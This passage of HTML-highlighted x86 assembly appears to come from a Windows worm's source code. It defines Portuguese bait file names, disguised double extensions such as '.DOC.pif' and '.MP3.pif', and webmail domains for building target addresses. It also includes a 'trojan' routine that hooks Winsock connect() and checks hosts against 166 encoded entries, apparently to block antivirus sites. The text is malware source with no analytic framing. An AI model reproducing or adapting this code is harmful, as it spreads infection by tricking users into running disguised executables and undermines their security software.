   </span><span class="sc5">msg_rename002</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'amor'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename003</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'felicidade'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'esperanca'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename005</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'namorados'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename006</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'reflita'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename007</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'pare_e_pense'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename008</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'jesus_conosco'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename009</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'destino'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename010</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'almas_gemeas'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename011</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'semente_do_bem'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename012</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'forca_infinita'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename013</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'espiritos'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename014</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'gratidao'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename015</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'atraia_a_deus'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename016</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'amar'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename017</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'elogiar'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename018</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'reconhecer'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename019</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'prospere_agora'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename020</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'mar_divino'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename021</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'virtudes'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename022</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'padre_marcelo'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename023</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'semeador'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename024</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'liberdade'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename025</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'vida_eterna'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename026</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'germine_aos_poucos'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename027</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'amigos'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename028</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'energia'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename029</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'cristais'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename030</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'incenso'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_rename031</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'saiba_amar'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">tbl_msg_rename000</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename000</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename001</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename002</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename003</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename004</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename005</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename006</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename007</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename008</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename009</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename010</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename011</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename012</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename013</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename014</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename015</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename016</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename017</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename018</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename019</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename020</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename021</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename022</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename023</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename024</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename025</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename026</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename027</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename028</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename029</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename030</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_rename031</span><span class="sc0">


   </span><span class="sc1">;   extensoes dos aplicativos</span><span class="sc0">

   </span><span class="sc5">msg_extens000</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_extens001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.scr'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_extens002</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.pif'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_extens003</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.DOC.pif'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_extens004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.TXT.pif'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_extens005</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.HTM.pif'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_extens006</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.BMP.pif'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_extens007</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.MP3.pif'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">tbl_msg_extens000</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_extens000</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_extens001</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_extens002</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_extens003</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_extens004</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_extens005</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_extens006</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_extens007</span><span class="sc0">

   </span><span class="sc5">msg_emailx000</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@hotmail.com'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_emailx001</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@globo.com'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_emailx002</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@usa.net'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_emailx003</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@zip.net'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_emailx004</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@aol.com'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_emailx005</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@tantofaz.net'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_emailx006</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@uol.com.br'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">msg_emailx007</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'@easymail.com'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">tbl_msg_emailx000</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_emailx000</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_emailx001</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_emailx002</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_emailx003</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_emailx004</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_emailx005</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_emailx006</span><span class="sc0">
   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_emailx007</span><span class="sc0">

   </span><span class="sc5">wsock_api</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc5">wsock_GlobalAlloc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">wsock_IsBadReadPtr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">wsock_GetSystemTime</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">wsock_ExitProcess</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">wsock_recv</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">trojan@004</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">MESS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0BFF5412Eh</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">connect_repcode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">;   return address</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">push_ret_connect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc1">; connect() now is free to be called</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ap_connect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_connect_byte</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">
   </span><span class="sc6">movsd</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;   socket</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">2</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;   sockaddr struc</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">)]</span><span class="sc0">   </span><span class="sc1">;   sockaddr len</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">NETSEH</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_error</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_x</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">host_back</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">host_back</span><span class="sc0">
   </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">av_host1</span><span class="sc0">

   </span><span class="sc5">AV_NUM</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">166</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">0e1h</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">0cah</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0e4h</span><span class="sc4">,</span><span class="sc2">0e7h</span><span class="sc4">,</span><span class="sc2">035h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc2">0c2h</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">086h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc2">016h</span><span class="sc4">,</span><span class="sc2">0d3h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc4">,</span><span class="sc2">0cch</span><span class="sc4">,</span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">07eh</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">0dah</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc2">04ah</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc2">0c1h</span><span class="sc4">,</span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc2">096h</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">019h</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc4">,</span><span class="sc2">0b3h</span><span class="sc4">,</span><span class="sc2">034h</span><span class="sc4">,</span><span class="sc2">006h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc2">0e2h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">051h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc2">0a8h</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc4">,</span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc2">07bh</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">0a7h</span><span class="sc4">,</span><span class="sc2">0d8h</span><span class="sc4">,</span><span class="sc2">0beh</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">01dh</span><span class="sc4">,</span><span class="sc2">03dh</span><span class="sc0">
